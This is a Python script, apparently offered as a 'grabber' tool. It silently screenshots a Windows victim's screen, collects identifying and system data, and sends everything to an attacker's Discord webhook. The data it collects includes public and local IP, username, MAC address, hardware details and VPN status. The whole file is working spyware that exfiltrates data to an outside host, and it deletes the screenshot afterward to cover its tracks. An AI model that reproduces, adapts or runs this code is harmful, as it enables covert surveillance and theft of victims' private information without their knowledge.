#author: suegdu

from requests import get
from discord_webhook import DiscordEmbed,DiscordWebhook
import platform
from platform import uname
import os
import sys
import time
import wmi
import psutil
import datetime
import subprocess
import pyautogui
import secrets
from pathlib import Path
from uuid import getnode as get_mac
import socket

DISCORD_WEBHOOK = "YOUR WEBHOOK LINK"






parent = Path(__file__).with_name("temp")
try:
    os.mkdir(parent)
    os.chdir(parent)
except FileExistsError:
    os.chdir(parent)

rs = secrets.token_hex(6)
sc = pyautogui.screenshot()
sc.save(f'{rs}file.png')
asr = f"{rs}file.png"
c = wmi.WMI()   
my_system = c.Win32_ComputerSystem()[0]
time2 = time.time()
sr = uname()

mac = get_mac()
now = datetime.datetime.now()
local_now = now.astimezone()
local_tz = local_now.tzinfo
local_tzname = local_tz.tzname(local_now)
vpn = get('http://ip-api.com/json?fields=proxy')
proxy = vpn.json()['proxy']
cpuis = psutil.cpu_percent()
host3 = socket.gethostname()
localip = socket.gethostbyname(host3)
if hasattr(sys, 'real_prefix'):
    st = True
else:
     st = False
def scale(bytes, suffix="B"):
    defined = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < defined:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= defined
proc = platform.processor() 

fknet = False
try:
 f = subprocess.check_output("ping google.com -n 1")
except:
    fknet = True
else:
    fknet = "Unknown"
partitions = psutil.disk_partitions()
disk_io = psutil.disk_io_counters()
net_io = psutil.net_io_counters()

partitions = psutil.disk_partitions()
for partition in partitions:
    try:
        partition_usage = psutil.disk_usage(partition.mountpoint)
    except PermissionError:
        continue

def sg():

 ip = get('https://api.ipify.org').text 
 webhook = DiscordWebhook(url=DISCORD_WEBHOOK,username="ST Grabber",content="Screenshot :")
 embed = DiscordEmbed(title="PT-H14", description="**User (Device)**", color=0x0c0057) 
 embed.set_author(name="ST", icon_url="https://www.shareicon.net/data/512x512/2015/09/28/647652_watch_512x512.png") 
 embed.set_thumbnail(url="https://www.blackhatwisdom.com/wp-content/uploads/2016/10/black-hat-wisdom-logo-2.png") 
 embed.add_embed_field(name="Public IP :", value=ip, inline=True) 
 embed.add_embed_field(name="Local IP :",value=localip)
 embed.add_embed_field(name="Hostname, Device :", value=f"{platform.node()}", inline=True)
 embed.add_embed_field(name="ETC :", value=f"{uname()}".replace("uname_result","").replace(")","").replace("(","").replace("'",""), inline=True) 
 embed.add_embed_field(name="User :",value=f" {os.getlogin()} ")
 embed.add_embed_field(name="Operating system :",value=f" {platform.system()}")
 embed.add_embed_field(name="Virtual Machine :",value=f" {st}")
 embed.add_embed_field(name="Manufacturer :",value=f" {my_system.Manufacturer}")
 embed.add_embed_field(name="Model :",value=f" {my_system. Model}")
 embed.add_embed_field(name="NumberOfProcessors :",value=f" {my_system.NumberOfProcessors}")
 embed.add_embed_field(name="SystemType :",value=f" {my_system.SystemType}")
 embed.add_embed_field(name="Disk Informations :",value=f"Total Size: {scale(partition_usage.total)}\nUsed: {scale(partition_usage.used)}\nFree: {scale(partition_usage.free)}\nPercentage: {partition_usage.percent}%\n\nTotal read: {scale(disk_io.read_bytes)}\nTotal write: {scale(disk_io.write_bytes)}")
 embed.add_embed_field(name="SystemFamily :",value=f" {my_system.SystemFamily}")
 embed.add_embed_field(name="Memory :",value=f" {psutil.virtual_memory()}")
 embed.add_embed_field(name="Path :", value=f"**{sys.argv[0]}**", inline=True)
 embed.add_embed_field(name="MAC Address :",value=mac)
 embed.add_embed_field(name="Local Timezone :", value=f"**{local_tzname}**", inline=True)
 embed.add_embed_field(name="Processor :", value=f"**{proc}**", inline=True)
 embed.add_embed_field(name="Network Informations :",value=f"Total Sent: {scale(net_io.bytes_sent)}\nTotal Received: {scale(net_io.bytes_recv)}")
 #embed.add_embed_field(name="CPU Usage :",value=cpuis)
 embed.add_embed_field(name="Fake Net :", value=f"**{fknet}**", inline=True)
 embed.add_embed_field(name="VPN :",value=proxy)
 embed.set_footer(text=f"{time2}", icon_url="https://static.thenounproject.com/png/2256517-200.png")
 with open(f"{asr}", "rb") as f:
    webhook.add_file(file=f.read(), filename=f'./{asr}')
 webhook.add_embed(embed)
 response = webhook.execute()



 os.remove(f"{asr}")


if __name__ == "__main__":
 sg()





